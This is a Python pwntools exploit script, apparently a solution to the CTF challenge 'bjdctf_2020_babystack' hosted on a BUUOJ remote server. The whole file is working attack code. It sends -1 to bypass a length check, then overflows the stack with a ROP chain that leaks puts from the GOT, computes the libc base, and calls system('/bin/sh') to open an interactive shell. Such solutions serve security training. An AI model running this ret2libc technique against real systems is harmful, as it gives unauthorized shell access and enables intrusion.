from pwn import *

context.log_level = "debug"

exe = ELF("./bjdctf_2020_babystack")
libc = ELF("./libc-2.23.so")
# r = exe.process()
r = remote("node4.buuoj.cn", 26206)

pop_rdi = p64(0x400833)
ret = p64(0x400561)
# 0x0000000000400833: pop rdi; ret;
# 0x0000000000400561: ret;

r.recvuntil(b":\n")
r.sendline(b"-1")
r.recvuntil(b"?\n")
r.send(
    cyclic(24)
    + ret
    + pop_rdi
    + p64(exe.got["puts"])
    + p64(exe.plt["puts"])
    + p64(exe.sym["main"])
)
libc_puts = u64(r.recvline().strip() + b"\x00" * 2)
libc_base = libc_puts - libc.sym["puts"]
system_addr = p64(libc_base + libc.sym["system"])
bin_sh_addr = p64(libc_base + next(libc.search(b"/bin/sh\x00")))
r.recvuntil(b":\n")
r.sendline(b"-1")
r.recvuntil(b"?\n")
r.send(cyclic(24) + pop_rdi + bin_sh_addr + system_addr)
r.interactive()
